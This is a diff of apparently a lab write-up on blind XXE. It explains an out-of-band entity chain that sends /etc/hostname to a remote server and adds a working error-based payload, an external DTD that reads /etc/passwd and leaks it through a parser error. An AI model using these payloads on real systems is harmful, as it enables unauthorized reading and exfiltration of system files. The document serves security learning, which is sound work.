@@ -99,4 +99,28 @@ Now again in `POST /product/stock` request by modyfing the body, injecting the b
 
 How this works?
 
-By specifing and invoking `xxe` parameter entity, we say to the parser to fetch further `ENTITY` definitions from specified url and inject them into `DOCTYPE` definition. Further fetched `ENTITY` definitions will read `/etc/hostname` file by `%filel;` entity and dynamically create and entity `%exfiltrate` that will fetch remote server with one of the query params containing file content via `%eval;` entity.
+By specifing and invoking `xxe` parameter entity, we say to the parser to fetch further `ENTITY` definitions from specified url and inject them into `DOCTYPE` definition and interpret them inline. Further fetched `ENTITY` definitions will read `/etc/hostname` file by `%filel;` entity and dynamically create and entity `%exfiltrate` that will fetch remote server with one of the query params containing file content via `%eval;` entity.
+
+## Exploiting blind XXE to retrieve data via error messages
+
+Similar to the previous situations.
+Casual entities are blocked for security reasons. Invalid values provided to `productId` or `stockId` are not reflected back to us.
+
+By injecting below payload we can see the error is returned:
+
+```
+<!DOCTYPE foo [<!ENTITY % xxe "test"> %xxe;]>
+```
+
+Now we can use exploit server to store partial dtd definitiona file at `/exploit.dtd`
+
+```
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///notexisting/%file;'>"> 
+%eval;
+%error;
+```
+
+Now injecting below payload to the `POST /product/stock` will cause entity declaration and invocation, which will cause to fetch and interpret inline the partial `exploit.dtd` definition.
+
+`exploit.dtd` defines a `file` parameter entity with value of `/etc/passwd` file content, and then evaluates dynamically `error` entity which tries to open the not existantant filename containing `/etc/passwd` value, which triggers an error and responds with it to the client.
